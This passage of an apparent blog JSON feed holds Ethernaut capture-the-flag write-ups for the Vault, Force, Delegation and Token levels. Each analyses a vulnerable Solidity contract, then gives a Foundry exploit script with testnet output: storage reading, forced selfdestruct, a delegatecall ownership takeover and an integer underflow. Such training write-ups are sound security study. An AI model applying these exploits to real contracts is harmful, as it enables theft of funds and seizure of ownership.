class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"kt\">bytes32</span> <span class=\"n\">_password</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">password</span> <span class=\"o\">==</span> <span class=\"n\">_password</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"n\">locked</span> <span class=\"o\">=</span> <span class=\"nb\">false</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Because the blockchain is transparent, secret keys cannot be stored on it.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>cast storage 0x65E998C6f70c90f149553c967BA4a38Ecc6213A9 10x412076657279207374726f6e67207365637265742070617373776f7264203a29</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-19-Vault/cyberchef.png\" alt=\"Image cyberchef\" /></p><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Vault.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">ValutSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Vault</span> <span class=\"k\">public</span> <span class=\"n\">vault_</span> <span class=\"o\">=</span> <span class=\"n\">Vault</span><span class=\"p\">(</span><span class=\"mh\">0x65E998C6f70c90f149553c967BA4a38Ecc6213A9</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">vault_</span><span class=\"p\">.</span><span class=\"n\">unlock</span><span class=\"p\">(</span><span class=\"mh\">0x412076657279207374726f6e67207365637265742070617373776f7264203a29</span><span class=\"p\">);</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/VaultSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...<span class=\"o\">[</span>⠰] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>⠒] Solc 0.8.29 finished <span class=\"k\">in </span>322.36msCompiler run successful!Script ran successfully.<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.00101144 gweiEstimated total gas used <span class=\"k\">for </span>script: 36108Estimated amount required: 0.00000003652107552 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0x14d0aaca36fb737a61c0a533652da5a4d2314117698a64a1788ec28633d7f1b1Block: 3685538Paid: 0.000000026441866776 ETH <span class=\"o\">(</span>26143 gas <span class=\"k\">*</span> 0.001011432 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000026441866776 ETH (26143 gas * avg 0.001011432 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-19-Vault/locked.png\" alt=\"Image locked\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-19-Vault/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/19/vault",
            
            
            
            "tags": ["blockchain","ethernaut","foundry"],
            
            "date_published": "2025-04-19T00:00:00+09:00",
            "date_modified": "2025-04-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/19/force",
            "title": "[Ethernaut] 07.Force",
            "summary": null,
            "content_text": "AnalysisThe goal is  make the balance of the contract greater than zero// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Force { /*                   MEOW ?         /\\_/\\   /    ____/ o o \\    /~____  =ø= /    (______)__m_m)                   */ }Solidity 0.8.30 Documentation - sending and receiving ether  💡 Neither contracts nor “external accounts” are currently able to prevent someone from sending them Ether. Contracts can react on and reject a regular transfer, but there are ways to move Ether without creating a message call. One way is to simply “mine to” the contract address and the second way is using selfdestruct(x).Solidity 0.8.30 Documentation - deactivate and self destructThe selfdestruct() function removes code from blockchain.It move Ether stored in the contract to a specified address without creating a message call.Even if a contract’s code does not contain a call to selfdestruct, it can still perform that operation using delegatecall or callcode.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Force.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract Ex {    constructor(address payable force_) payable {        selfdestruct(force_);    }}contract ForceSol is Script {    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        new Ex{value: 1 wei}(payable(0xD38Cdc747b3Fdc5B553ec592a89b92db3015c2e6));        vm.stopBroadcast();    }}$ forge script script/ForceSol.sol --broadcast --tc ForceSol[⠊] Compiling...No files changed, compilation skippedScript ran successfully.## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001062799 gweiEstimated total gas used for script: 83584Estimated amount required: 0.000000088832991616 ETH==========================##### holesky✅  [Success] Hash: 0xfe8f4a467eb59cc75d1969cbcb0338d23b568d91028e387bba6bcebb5c605526Contract Address: 0xfF2baB3F127feb02B77A4dBd869b25f63d442b79Block: 3677667Paid: 0.000000068333210136 ETH (64296 gas * 0.001062791 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000068333210136 ETH (64296 gas * avg 0.001062791 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>make the balance of the contract greater than zero</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Force</span> <span class=\"p\">{</span> <span class=\"cm\">/*                   MEOW ?         /\\_/\\   /    ____/ o o \\    /~____  =ø= /    (______)__m_m)                   */</span> <span class=\"p\">}</span></code></pre></div></div><p><a href=\"https://docs.soliditylang.org/en/latest/security-considerations.html#sending-and-receiving-ether\">Solidity 0.8.30 Documentation - sending and receiving ether</a></p><blockquote>  <p>💡 Neither contracts nor “external accounts” are currently able to prevent someone from sending them Ether. Contracts can react on and reject a regular transfer, but there are ways to move Ether without creating a message call. One way is to simply “mine to” the contract address and the second way is using <code class=\"language-plaintext highlighter-rouge\">selfdestruct(x)</code>.</p></blockquote><p><a href=\"https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#deactivate-and-self-destruct\">Solidity 0.8.30 Documentation - deactivate and self destruct</a></p><p>The <code class=\"language-plaintext highlighter-rouge\">selfdestruct()</code> function removes code from blockchain.</p><p>It move Ether stored in the contract to a specified address without creating a message call.</p><p>Even if a contract’s code does not contain a call to selfdestruct, it can still perform that operation using delegatecall or callcode.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Force.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Ex</span> <span class=\"p\">{</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"k\">payable</span> <span class=\"n\">force_</span><span class=\"p\">)</span> <span class=\"k\">payable</span> <span class=\"p\">{</span>        <span class=\"nb\">selfdestruct</span><span class=\"p\">(</span><span class=\"n\">force_</span><span class=\"p\">);</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">ForceSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"k\">new</span> <span class=\"n\">Ex</span><span class=\"p\">{</span><span class=\"n\">value</span><span class=\"o\">:</span> <span class=\"mi\">1</span> <span class=\"kc\">wei</span><span class=\"p\">}(</span><span class=\"k\">payable</span><span class=\"p\">(</span><span class=\"mh\">0xD38Cdc747b3Fdc5B553ec592a89b92db3015c2e6</span><span class=\"p\">));</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/ForceSol.sol <span class=\"nt\">--broadcast</span> <span class=\"nt\">--tc</span> ForceSol<span class=\"o\">[</span>⠊] Compiling...No files changed, compilation skippedScript ran successfully.<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001062799 gweiEstimated total gas used <span class=\"k\">for </span>script: 83584Estimated amount required: 0.000000088832991616 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xfe8f4a467eb59cc75d1969cbcb0338d23b568d91028e387bba6bcebb5c605526Contract Address: 0xfF2baB3F127feb02B77A4dBd869b25f63d442b79Block: 3677667Paid: 0.000000068333210136 ETH <span class=\"o\">(</span>64296 gas <span class=\"k\">*</span> 0.001062791 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000068333210136 ETH (64296 gas * avg 0.001062791 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-19-Force/getbalance.png\" alt=\"Image getbalance\" /></p><p><img src=\"https://0o3q.github.io/images/2025-04-19-Force/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/19/force",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","selfdestruct"],
            
            "date_published": "2025-04-19T00:00:00+09:00",
            "date_modified": "2025-04-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/19/delegation",
            "title": "[Ethernaut] 06.Delegation",
            "summary": null,
            "content_text": "AnalysisThe goal is  claim ownership// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Delegate {    address public owner;    constructor(address _owner) {        owner = _owner;    }    function pwn() public {        owner = msg.sender;    }}contract Delegation {    address public owner;    Delegate delegate;    constructor(address _delegateAddress) {        delegate = Delegate(_delegateAddress);        owner = msg.sender;    }    fallback() external {        (bool result,) = address(delegate).delegatecall(msg.data);        if (result) {            this;        }    }}The fallback() function in the Delegation contract performs delegatecall() to the Delegate contract.The Delegation contract’s state can be changed by caliing the pwn() function in Delegate contract via delegatecall().msg.sender in the Delegate contract will be EOA because the call is made by using delegatecall().Exploit// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import \"../src/Delegation.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract DelegationSol is Script {    Delegation public delegation_ = Delegation(0x604BD638031054664E87618f46871c5423E9cbFF);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        address(delegation_).call(abi.encodeWithSignature(\"pwn()\"));        console.log(\"owner: \", delegation_.owner());        vm.stopBroadcast();    }}$ forge script script/DelegationSol.sol --broadcast[⠊] Compiling...[⠰] Compiling 1 files with Solc 0.8.29[⠔] Solc 0.8.29 finished in 280.67msCompiler run successful with warnings:Warning (9302): Return value of low-level calls not used.  --&gt; script/DelegationSol.sol:14:9:   |14 |         address(delegation_).call(abi.encodeWithSignature(\"pwn()\"));   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.== Logs ==  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001000019 gweiEstimated total gas used for script: 43100Estimated amount required: 0.0000000431008189 ETH==========================##### holesky✅  [Success] Hash: 0xd749896a13ac87778efd535f37a37c59d6b88fedeb517b326aa83c0af160e8fdBlock: 3677303Paid: 0.000000031204249632 ETH (31204 gas * 0.001000008 gwei)✅ Sequence #1 on holesky | Total Paid: 0.000000031204249632 ETH (31204 gas * avg 0.001000008 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>claim ownership</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Delegate</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">_owner</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">pwn</span><span class=\"p\">()</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span><span class=\"p\">}</span><span class=\"k\">contract</span> <span class=\"n\">Delegation</span> <span class=\"p\">{</span>    <span class=\"kt\">address</span> <span class=\"k\">public</span> <span class=\"n\">owner</span><span class=\"p\">;</span>    <span class=\"n\">Delegate</span> <span class=\"n\">delegate</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_delegateAddress</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"n\">delegate</span> <span class=\"o\">=</span> <span class=\"n\">Delegate</span><span class=\"p\">(</span><span class=\"n\">_delegateAddress</span><span class=\"p\">);</span>        <span class=\"n\">owner</span> <span class=\"o\">=</span> <span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">fallback</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"p\">(</span><span class=\"kt\">bool</span> <span class=\"n\">result</span><span class=\"p\">,)</span> <span class=\"o\">=</span> <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">delegate</span><span class=\"p\">).</span><span class=\"nb\">delegatecall</span><span class=\"p\">(</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">data</span><span class=\"p\">);</span>        <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">result</span><span class=\"p\">)</span> <span class=\"p\">{</span>            <span class=\"nb\">this</span><span class=\"p\">;</span>        <span class=\"p\">}</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>The <code class=\"language-plaintext highlighter-rouge\">fallback()</code> function in the Delegation contract performs <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code> to the Delegate contract.</p><p>The Delegation contract’s state can be changed by caliing the <code class=\"language-plaintext highlighter-rouge\">pwn()</code> function in Delegate contract via <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code>.</p><p><code class=\"language-plaintext highlighter-rouge\">msg.sender</code> in the Delegate contract will be EOA because the call is made by using <code class=\"language-plaintext highlighter-rouge\">delegatecall()</code>.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.8</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Delegation.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">DelegationSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Delegation</span> <span class=\"k\">public</span> <span class=\"n\">delegation_</span> <span class=\"o\">=</span> <span class=\"n\">Delegation</span><span class=\"p\">(</span><span class=\"mh\">0x604BD638031054664E87618f46871c5423E9cbFF</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"kt\">address</span><span class=\"p\">(</span><span class=\"n\">delegation_</span><span class=\"p\">).</span><span class=\"nb\">call</span><span class=\"p\">(</span><span class=\"n\">abi</span><span class=\"p\">.</span><span class=\"n\">encodeWithSignature</span><span class=\"p\">(</span><span class=\"s\">\"pwn()\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"owner: \"</span><span class=\"p\">,</span> <span class=\"n\">delegation_</span><span class=\"p\">.</span><span class=\"n\">owner</span><span class=\"p\">());</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">stopBroadcast</span><span class=\"p\">();</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$ </span>forge script script/DelegationSol.sol <span class=\"nt\">--broadcast</span><span class=\"o\">[</span>⠊] Compiling...<span class=\"o\">[</span>⠰] Compiling 1 files with Solc 0.8.29<span class=\"o\">[</span>⠔] Solc 0.8.29 finished <span class=\"k\">in </span>280.67msCompiler run successful with warnings:Warning <span class=\"o\">(</span>9302<span class=\"o\">)</span>: Return value of low-level calls not used.  <span class=\"nt\">--</span><span class=\"o\">&gt;</span> script/DelegationSol.sol:14:9:   |14 |         address<span class=\"o\">(</span>delegation_<span class=\"o\">)</span>.call<span class=\"o\">(</span>abi.encodeWithSignature<span class=\"o\">(</span><span class=\"s2\">\"pwn()\"</span><span class=\"o\">))</span><span class=\"p\">;</span>   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^Script ran successfully.<span class=\"o\">==</span> Logs <span class=\"o\">==</span>  owner:  0x6f5Ad1E6F1a624E4Ad37f0B7D6f100ab1Db29514<span class=\"c\">## Setting up 1 EVM.</span><span class=\"o\">==========================</span>Chain 17000Estimated gas price: 0.001000019 gweiEstimated total gas used <span class=\"k\">for </span>script: 43100Estimated amount required: 0.0000000431008189 ETH<span class=\"o\">==========================</span><span class=\"c\">##### holesky</span>✅  <span class=\"o\">[</span>Success] Hash: 0xd749896a13ac87778efd535f37a37c59d6b88fedeb517b326aa83c0af160e8fdBlock: 3677303Paid: 0.000000031204249632 ETH <span class=\"o\">(</span>31204 gas <span class=\"k\">*</span> 0.001000008 gwei<span class=\"o\">)</span>✅ Sequence <span class=\"c\">#1 on holesky | Total Paid: 0.000000031204249632 ETH (31204 gas * avg 0.001000008 gwei)</span><span class=\"o\">==========================</span>ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.</code></pre></div></div><p><img src=\"https://0o3q.github.io/images/2025-04-18-Delegation/complete.png\" alt=\"Image complete\" /></p>",
            "url": "https://0o3q.github.io/2025/04/19/delegation",
            
            
            
            "tags": ["blockchain","ethernaut","foundry","delegatecall","storage_collision"],
            
            "date_published": "2025-04-19T00:00:00+09:00",
            "date_modified": "2025-04-19T00:00:00+09:00",
            
                "author":  {
                "name": "0o3q",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://0o3q.github.io/2025/04/18/token",
            "title": "[Ethernaut] 05.Token",
            "summary": null,
            "content_text": "AnalysisThe goal is  hands on any additional tokens.// SPDX-License-Identifier: MITpragma solidity ^0.6.0;contract Token {    mapping(address =&gt; uint256) balances;    uint256 public totalSupply;    constructor(uint256 _initialSupply) public {        balances[msg.sender] = totalSupply = _initialSupply;    }    function transfer(address _to, uint256 _value) public returns (bool) {        require(balances[msg.sender] - _value &gt;= 0);        balances[msg.sender] -= _value;        balances[_to] += _value;        return true;    }    function balanceOf(address _owner) public view returns (uint256 balance) {        return balances[_owner];    }}Overflow can occur in Solidity versions under 0.8.0.Exploit// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import \"../src/Token.sol\";import \"forge-std/Script.sol\";import \"forge-std/console.sol\";contract TokenSol is Script {    Token public token_ = Token(0xc5176701831Dcf084be5f95617605D2107d97182);    function run() external {        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));        console.log(\"balance: \", token_.balanceOf(vm.envAddress(\"MY_ADDRESS\")));        token_.transfer(address(0), 21);        console.log(\"balance: \", token_.balanceOf(vm.envAddress(\"MY_ADDRESS\")));        vm.stopBroadcast();    }}$ forge script script/TokenSol.sol --broadcast[⠊] Compiling...[⠒] Compiling 1 files with Solc 0.6.12[⠑] Solc 0.6.12 finished in 497.00msCompiler run successful!Script ran successfully.== Logs ==  balance:  20  balance:  115792089237316195423570985008687907853269984665640564039457584007913129639935## Setting up 1 EVM.==========================Chain 17000Estimated gas price: 0.001000007 gweiEstimated total gas used for script: 67542Estimated amount required: 0.000000067542472794 ETH==========================##### holesky✅  [Success] Hash: 0x6b9a4361bf15dc0a907240c72dd64d9c5cfbffafd2bbfd0197ad7dd053aa115eBlock: 3677316Paid: 0.0000000489 ETH (48900 gas * 0.001 gwei)✅ Sequence #1 on holesky | Total Paid: 0.0000000489 ETH (48900 gas * avg 0.001 gwei)==========================ONCHAIN EXECUTION COMPLETE &amp; SUCCESSFUL.",
            "content_html": "<h1 id=\"analysis\">Analysis</h1><hr /><p>The goal is</p><ol>  <li>hands on any additional tokens.</li></ol><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">Token</span> <span class=\"p\">{</span>    <span class=\"k\">mapping</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"o\">=&gt;</span> <span class=\"kt\">uint256</span><span class=\"p\">)</span> <span class=\"n\">balances</span><span class=\"p\">;</span>    <span class=\"kt\">uint256</span> <span class=\"k\">public</span> <span class=\"n\">totalSupply</span><span class=\"p\">;</span>    <span class=\"k\">constructor</span><span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"n\">_initialSupply</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"p\">{</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">totalSupply</span> <span class=\"o\">=</span> <span class=\"n\">_initialSupply</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"nb\">transfer</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_to</span><span class=\"p\">,</span> <span class=\"kt\">uint256</span> <span class=\"n\">_value</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">bool</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"nb\">require</span><span class=\"p\">(</span><span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-</span> <span class=\"n\">_value</span> <span class=\"o\">&gt;=</span> <span class=\"mi\">0</span><span class=\"p\">);</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">msg</span><span class=\"p\">.</span><span class=\"n\">sender</span><span class=\"p\">]</span> <span class=\"o\">-=</span> <span class=\"n\">_value</span><span class=\"p\">;</span>        <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_to</span><span class=\"p\">]</span> <span class=\"o\">+=</span> <span class=\"n\">_value</span><span class=\"p\">;</span>        <span class=\"k\">return</span> <span class=\"nb\">true</span><span class=\"p\">;</span>    <span class=\"p\">}</span>    <span class=\"k\">function</span> <span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"kt\">address</span> <span class=\"n\">_owner</span><span class=\"p\">)</span> <span class=\"k\">public</span> <span class=\"k\">view</span> <span class=\"k\">returns</span> <span class=\"p\">(</span><span class=\"kt\">uint256</span> <span class=\"nb\">balance</span><span class=\"p\">)</span> <span class=\"p\">{</span>        <span class=\"k\">return</span> <span class=\"n\">balances</span><span class=\"p\">[</span><span class=\"n\">_owner</span><span class=\"p\">];</span>    <span class=\"p\">}</span><span class=\"p\">}</span></code></pre></div></div><p>Overflow can occur in Solidity versions under 0.8.0.</p><h1 id=\"exploit\">Exploit</h1><hr /><div class=\"language-solidity highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">// SPDX-License-Identifier: MIT</span><span class=\"k\">pragma</span> <span class=\"n\">solidity</span> <span class=\"o\">^</span><span class=\"mf\">0.6</span><span class=\"p\">.</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"../src/Token.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/Script.sol\"</span><span class=\"p\">;</span><span class=\"k\">import</span> <span class=\"s\">\"forge-std/console.sol\"</span><span class=\"p\">;</span><span class=\"k\">contract</span> <span class=\"n\">TokenSol</span> <span class=\"k\">is</span> <span class=\"n\">Script</span> <span class=\"p\">{</span>    <span class=\"n\">Token</span> <span class=\"k\">public</span> <span class=\"n\">token_</span> <span class=\"o\">=</span> <span class=\"n\">Token</span><span class=\"p\">(</span><span class=\"mh\">0xc5176701831Dcf084be5f95617605D2107d97182</span><span class=\"p\">);</span>    <span class=\"k\">function</span> <span class=\"n\">run</span><span class=\"p\">()</span> <span class=\"k\">external</span> <span class=\"p\">{</span>        <span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">startBroadcast</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envUint</span><span class=\"p\">(</span><span class=\"s\">\"PRIVATE_KEY\"</span><span class=\"p\">));</span>        <span class=\"n\">console</span><span class=\"p\">.</span><span class=\"n\">log</span><span class=\"p\">(</span><span class=\"s\">\"balance: \"</span><span class=\"p\">,</span> <span class=\"n\">token_</span><span class=\"p\">.</span><span class=\"n\">balanceOf</span><span class=\"p\">(</span><span class=\"n\">vm</span><span class=\"p\">.</span><span class=\"n\">envAddress</span><span class=\"p\">(</span><span class=\"s\">\"MY_ADDRESS\"</span><span class=\"p\">)));</span>        <span class=\"n\">token_</span><span 